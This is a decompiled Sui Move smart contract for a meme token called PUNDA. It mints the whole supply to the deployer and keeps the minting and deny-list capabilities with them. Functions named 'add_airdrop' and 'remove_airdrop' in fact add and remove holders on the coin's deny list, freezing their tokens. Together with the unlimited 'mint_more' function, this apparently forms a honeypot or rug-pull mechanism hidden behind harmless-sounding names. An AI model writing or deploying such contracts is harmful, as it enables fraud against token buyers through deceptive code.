module 0x8972b66e350d410add8527d381f3ad002b5f63b5c56d349611f7b4859d952829::PUNDA {
    struct PUNDA has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUNDA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PUNDA>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: PUNDA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PUNDA>(arg0, 6, b"PUNDA", b"Sui Punda", b"CUTE PANDA FLYING", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmRapkmjgZA3LVmUZWw5ZFbN94fZeoEnvyAYTgy1n5yRab?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PUNDA>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<PUNDA>>(0x2::coin::mint<PUNDA>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<PUNDA>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PUNDA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<PUNDA>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<PUNDA>>(0x2::coin::mint<PUNDA>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUNDA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PUNDA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

